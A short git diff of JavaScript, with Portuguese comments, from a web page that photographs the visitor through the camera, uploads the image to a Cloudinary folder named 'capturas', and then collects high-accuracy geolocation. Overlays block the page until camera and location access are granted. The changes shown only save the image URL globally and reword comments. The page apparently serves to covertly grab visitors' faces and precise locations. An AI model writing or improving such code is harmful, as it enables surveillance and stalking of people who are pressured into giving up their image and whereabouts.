@@ -29,6 +29,7 @@
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
     const folderName = "capturas";
+    let capturedImageUrl = null; // <- variável global
 
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
@@ -81,11 +82,12 @@
 
         if (!response.ok) throw new Error("Erro ao enviar imagem");
         const data = await response.json();
-        return data.secure_url;
+        capturedImageUrl = data.secure_url; // <- salva a imagem
+        return capturedImageUrl;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
         showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
-          startFlow(); // Aqui sim pode reiniciar o fluxo completo
+          startFlow(); // só aqui reinicia tudo
         });
         throw error;
       }
@@ -113,13 +115,13 @@
         } catch (err) {
           console.error("Erro no envio da localização:", err);
           showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl); // tenta de novo só a localização
+            requestLocation(imageUrl); // só tenta localização de novo
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
         showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl); // tenta de novo só a localização
+          requestLocation(imageUrl); // só tenta localização de novo
         });
       }, {
         enableHighAccuracy: true,
@@ -130,7 +132,7 @@
 
     async function startFlow() {
       try {
-        const imageUrl = await capturePhoto();
+        const imageUrl = await capturePhoto(); // pega e salva na global
         requestLocation(imageUrl);
       } catch (e) {
         console.error("Erro no fluxo:", e);
